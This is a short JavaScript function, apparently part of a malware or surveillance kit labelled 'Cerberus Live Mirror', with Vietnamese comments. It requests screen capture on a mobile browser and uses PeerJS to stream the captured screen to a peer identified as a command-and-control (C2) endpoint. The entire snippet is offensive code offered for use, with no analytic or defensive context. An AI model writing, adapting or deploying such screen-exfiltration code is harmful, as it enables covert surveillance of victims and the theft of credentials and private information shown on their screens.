// CERBERUS LIVE MIRROR - WEBRTC STREAMER
async function startMirror(c2_peer_id) {
    try {
        // Trên thiết bị Mobile, yêu cầu quyền capture màn hình trình duyệt
        const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
        const peer = new Peer(); // Sử dụng thư viện PeerJS
        
        peer.on('open', (id) => {
            const call = peer.call(c2_peer_id, stream);
            console.log("[+] Mirroring Stream established.");
        });
    } catch (err) {
        console.error("[-] Mirror failed: " + err);
    }
}